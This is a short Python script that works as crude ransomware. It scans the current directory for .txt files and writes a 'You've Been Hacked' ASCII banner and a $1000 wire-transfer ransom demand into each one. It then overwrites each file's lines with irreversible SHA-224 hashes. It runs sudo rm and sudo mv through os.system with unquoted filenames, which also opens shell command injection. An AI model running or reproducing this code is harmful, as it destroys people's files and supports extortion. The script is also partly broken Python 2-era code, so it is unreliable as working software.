import os
import hashlib

os.system("ls -al >> list.txt")

ls_file = open("list.txt", "r")

for file_line in ls_file:
	if ".txt" in file_line:
		while " " in file_line:
			file_line = file_line[file_line.index(" ") + 1:]
		filename = file_line[:file_line.index("\n")]

		f = open(filename, "r")
		f2 = open(filename + "2", "w")

		os.system("echo \"     )                                                      )                               \" >> hack.txt")
		os.system("echo \"  ( /(           (                 (                     ( /(                )        (     \" >> hack.txt;")
		os.system("echo \"  )\())       (  )\  )      (    ( )\    (    (          )\())    )       ( /(    (   )\ )  \" >> hack.txt;")
		os.system("echo \" ((_)\  (    ))\((_)/((    ))\   )((_)  ))\  ))\  (     ((_)\  ( /(   (   )\())  ))\ (()/(  \" >> hack.txt;")
		os.system("echo \"__ ((_) )\  /((_)  (_))\  /((_) ((_)_  /((_)/((_) )\ )   _((_) )(_))  )\ ((_)\  /((_) ((_)) \" >> hack.txt;")
		os.system("echo \"\ \ / /((_)(_))(   _)((_)(_))    | _ )(_)) (_))  _(_/(  | || |((_)_  ((_)| |(_)(_))   _| |  \" >> hack.txt;")
		os.system("echo \" \ V // _ \| || |  \ V / / -_)   | _ \/ -_)/ -_)| ' \)) | __ |/ _\ |/ _| | / / / -_)/ _\ |  \" >> hack.txt;")
		os.system("echo \"  |_| \___/ \_,_|   \_/  \___|   |___/\___|\___||_||_|  |_||_|\__,_|\__| |_\_\ \___|\__,_|  \" >> hack.txt;")
		os.system("echo \"                                                                                            \" >> hack.txt;")

		f3 = open("hack.txt", "r")

		for line in f3:
			f2.write(line)

		f2.write("Your files have been taken ransom! Make a wire transfer of $1000 to 0123456789012 via 123456789 in order to regain access to your files.\n\n")

		for line in f:
			if not line is "\n" and not line is "":
				f2.write(hashlib.sha224(line).hexdigest() + "\n")

		f.close()
		f2.close()
		f3.close()

		os.system("sudo rm hack.txt")
		os.system("sudo mv " + filename + "2 " + filename)
		
os.system("sudo rm list.txt")
